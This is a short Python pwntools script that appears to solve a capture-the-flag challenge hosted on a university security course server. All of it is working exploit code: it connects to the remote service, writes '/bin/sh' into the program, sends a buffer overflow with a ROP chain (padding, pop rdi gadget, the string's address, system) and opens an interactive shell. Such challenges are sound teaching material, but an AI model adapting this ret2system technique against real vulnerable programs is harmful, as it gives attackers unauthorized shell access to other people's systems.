from pwn import *

#r = process("./chall6", env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("cusecurity.cs.colorado.edu", 2228)

r.sendlineafter(b"> ", b"/bin/sh")

system_addr = 0x4012ea
bin_sh_addr = 0x404060
pop_rdi = 0x4013c3
ret = 0x40101a

payload  = b"A"*56
#payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

r.sendlineafter(b": ", payload)

r.interactive()
